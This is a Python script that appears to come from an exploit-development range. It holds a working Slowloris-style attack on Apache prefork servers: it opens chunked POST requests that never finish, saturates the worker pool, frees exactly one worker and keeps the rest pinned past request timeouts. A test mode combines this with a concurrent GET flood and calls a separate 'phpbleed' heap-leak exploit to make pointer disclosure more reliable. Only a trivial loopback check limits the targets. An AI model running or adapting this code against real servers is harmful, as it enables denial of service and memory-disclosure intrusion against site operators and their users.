#!/usr/bin/env python3
"""va_pin.py - adaptive chunked-POST worker pin for Apache prefork targets.

Ported DESIGN (not code-execution) from the Percivalll static audit
(lanes/vendor-audit/notes.md "worker-pinning"; adaptations.md #1):
  - each pin = POST with Transfer-Encoding: chunked, one 4KiB chunk sent,
    terminating zero-chunk NEVER sent -> worker is BUSY (mid-body), so
    MaxSpareServers cannot reap it and KeepAliveTimeout never applies.
  - adaptive saturation: open pins until a static-file probe times out
    (= pool saturated); then close pins from the tail until a probe
    succeeds (= exactly ONE free worker). Works on any worker count.
  - maintenance: resend 4KiB/s per pin (>= 8x Debian mod_reqtimeout
    body=10,minrate=500 floor; 512B/s was observed to fail on jitter).

This is OUR implementation against OUR range containers (loopback guard
inherited). Measurement harness mode takes NO flock (it does no exploit
spray; the one-stream-per-target flock belongs to the exploit tools).

CLI:
  python3 va_pin.py <port> [--host 127.0.0.1] [--probe-path /readme.html]
      [--max-pins 300] [--hold 600]
  -> saturate, free one, hold, print "READY held=N freed=1" then keep
     refreshing pins until hold expires. Prints "dropped N" on losses.

  python3 va_pin.py test <port> [--n 10] [--flood 30]
  -> loadprobe-style A/B: N leak deliveries under a 30-concurrent GET
     flood, WITHOUT pin vs WITH pin; prints delivered-X/N for both.
     (Leak = the phpbleed heap_leak oracle against the gadget app; the
     flood is plain GETs. Delivery = a heap pointer comes back.)
"""
from __future__ import annotations

import argparse
import concurrent.futures
import importlib.util
import os
import socket
import sys
import time
from urllib.parse import urlparse

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CHUNK = 4096
TICK = 1.0


def _load_phpbleed():
    spec = importlib.util.spec_from_file_location(
        "phpbleed_bastet", os.path.join(REPO, "phpbleed-bastet.py"))
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


def open_pin(host: str, port: int) -> socket.socket:
    s = socket.create_connection((host, port), timeout=10)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.sendall((f"POST / HTTP/1.1\r\nHost: {host}:{port}\r\n"
               "Content-Type: application/x-www-form-urlencoded\r\n"
               "Transfer-Encoding: chunked\r\n"
               "Connection: keep-alive\r\n\r\n").encode())
    s.sendall(("%x\r\n" % CHUNK).encode() + b"A" * CHUNK + b"\r\n")
    return s


def probe(host: str, port: int, path: str, timeout: float = 1.0) -> bool:
    s = None
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        s.sendall((f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
                   "Connection: close\r\n\r\n").encode())
        return s.recv(64).startswith(b"HTTP/")
    except OSError:
        return False
    finally:
        if s:
            try:
                s.close()
            except OSError:
                pass


def pin_and_free_one(host, port, probe_path, max_pins=300, hold=600):
    """Saturate then free exactly one worker. Returns (pins, freed)."""
    pins = []
    for _ in range(max_pins):
        try:
            pins.append(open_pin(host, port))
        except OSError:
            break
        time.sleep(0.02)
        if not probe(host, port, probe_path):
            print(f"saturated at {len(pins)} pins", flush=True)
            break
    freed = False
    while pins:
        s = pins.pop()
        try:
            s.close()
        except OSError:
            pass
        time.sleep(0.05)
        if probe(host, port, probe_path):
            freed = True
            break
    print(f"READY held={len(pins)} freed={freed}", flush=True)
    return pins, freed


def maintain(pins, host, port, hold):
    deadline = time.time() + hold
    dropped = 0
    while time.time() < deadline and pins:
        time.sleep(TICK)
        for s in list(pins):
            try:
                s.sendall(("%x\r\n" % CHUNK).encode() + b"A" * CHUNK + b"\r\n")
            except OSError:
                try:
                    s.close()
                except OSError:
                    pass
                pins.remove(s)
                dropped += 1
    if dropped:
        print(f"dropped {dropped} pins (worker count is no longer exact)",
              flush=True)
    for s in pins:
        try:
            s.close()
        except OSError:
            pass
    print("released", flush=True)


# ------------------------------------------------------------- flood test --
def flood_worker(host, port, path, stop_at):
    s = None
    while time.time() < stop_at:
        try:
            s = socket.create_connection((host, port), timeout=5)
            s.settimeout(5)
            s.sendall((f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
                       "Connection: close\r\n\r\n").encode())
            while s.recv(65536):
                pass
        except OSError:
            pass
        finally:
            if s:
                try:
                    s.close()
                except OSError:
                    pass
                s = None
        time.sleep(0.05)   # pace the flood: saturate workers, not the GIL


def run_test(host, port, probe_path, n, flood):
    pb = _load_phpbleed()
    pb.guard_target(f"http://{host}:{port}/")
    t = pb.Target(f"http://{host}:{port}/index.php", field="cook", timeout=6)

    def deliver_once():
        try:
            return pb.heap_leak(t) is not None
        except Exception:
            return False

    # baseline: flood only
    stop_at = time.time() + 240
    with concurrent.futures.ThreadPoolExecutor(max_workers=flood) as ex:
        flooders = [ex.submit(flood_worker, host, port, "/index.php", stop_at)
                    for _ in range(flood)]
        base = sum(deliver_once() for _ in range(n))
    print(f"BASELINE (no pin): delivered {base}/{n} under {flood}-concurrent flood",
          flush=True)

    # pinned: pins + flood
    pins, freed = pin_and_free_one(host, port, probe_path)
    stop_at = time.time() + 240
    with concurrent.futures.ThreadPoolExecutor(max_workers=flood) as ex:
        flooders = [ex.submit(flood_worker, host, port, "/index.php", stop_at)
                    for _ in range(flood)]
        pinned = sum(deliver_once() for _ in range(n))
    for s in pins:
        try:
            s.close()
        except OSError:
            pass
    print(f"PINNED (held={len(pins)} freed={freed}): "
          f"delivered {pinned}/{n} under {flood}-concurrent flood", flush=True)
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="va_pin - adaptive chunked-POST "
                                "worker pin (range-only)")
    ap.add_argument("mode_or_port",
                    help="port number, or 'test' for the flood A/B")
    ap.add_argument("port", nargs="?", type=int)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--probe-path", default="/readme.html")
    ap.add_argument("--max-pins", type=int, default=300)
    ap.add_argument("--hold", type=int, default=600)
    ap.add_argument("--n", type=int, default=10, help="test: leak deliveries")
    ap.add_argument("--flood", type=int, default=30, help="test: concurrency")
    a = ap.parse_args()
    u = urlparse("http://" + a.host)
    if u.hostname not in ("127.0.0.1", "localhost", "::1"):
        raise SystemExit("[!] loopback only (range rules)")
    if a.mode_or_port == "test" and a.port:
        return run_test(a.host, a.port, a.probe_path, a.n, a.flood)
    port = int(a.mode_or_port)
    pins, freed = pin_and_free_one(a.host, port, a.probe_path,
                                   a.max_pins, a.hold)
    if freed:
        maintain(pins, a.host, port, a.hold)
    return 0 if freed else 1


if __name__ == "__main__":
    sys.exit(main())
